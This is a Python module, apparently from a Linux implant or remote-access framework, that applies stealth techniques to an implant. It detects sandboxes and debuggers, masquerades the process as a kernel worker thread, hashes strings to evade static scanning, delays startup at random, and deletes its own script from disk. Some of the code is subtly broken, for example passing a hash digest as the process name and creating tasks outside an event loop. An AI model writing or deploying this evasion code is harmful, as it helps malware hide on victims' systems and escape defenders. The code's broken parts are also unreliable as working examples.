from .base_implant import BaseImplant
import platform
import sys
import os
import ctypes
import asyncio  # For non-blocking delays
import random
import hashlib  # For hashing strings (anti-static analysis)

def apply_linux_stealth(implant):
    """Apply stealth tactics (called from BaseImplant)"""
    from utilities.anti_analysis import AntiAnalysis
    anti = AntiAnalysis()
    if anti.detect_virtualization() or anti.detect_debugger():
        implant.logger.warning("Sandbox detected; skipping stealth")
        return

    # Hash strings to evade static scans
    def hash_str(s: str) -> bytes:
        return hashlib.sha256(s.encode()).digest()[:32]

    # Masquerade process (use setproctitle if avail, fallback prctl)
    try:
        import setproctitle
        fake_name = "[kworker/0:1H-kblockd]"  # Kernel-like
        setproctitle.setproctitle(fake_name)
    except ImportError:
        try:
            libc = ctypes.CDLL("libc.so.6")
            # PR_SET_NAME = 15; hash to avoid strings
            pr_set_name = 15
            fake_name_bytes = hash_str("[kworker/0:1H-kblockd]")
            libc.prctl(pr_set_name, fake_name_bytes, 0, 0, 0)
        except:
            pass  # No-op fallback

    # Non-blocking startup delay (async-friendly)
    delay = random.uniform(5, 30) if implant.stealth_level == 'high' else random.uniform(1, 5)
    asyncio.create_task(asyncio.sleep(delay))  # Fire-and-forget; doesn't block run()

    # Kill switch
    if os.environ.get("GG_KILL") == "1":
        sys.exit(0)

    # Self-delete (memory-only sim; unlink if file-based)
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.unlink(script_path)
    except:
        pass

    # CPU mask during delay (look active)
    def cpu_spin():
        while asyncio.get_event_loop().time() < delay:  # Simplified
            _ = sum(i for i in range(1000))  # Light CPU
    asyncio.create_task(asyncio.to_thread(cpu_spin))

# For direct instantiation (backward compat)
class LinuxImplant(BaseImplant):
    def __init__(self, config: dict):
        if platform.system().lower() != 'linux':
            raise Warning("LinuxImplant on non-Linux; using BaseImplant")
        super().__init__(config)
        apply_linux_stealth(self)  # Apply immediately for direct use
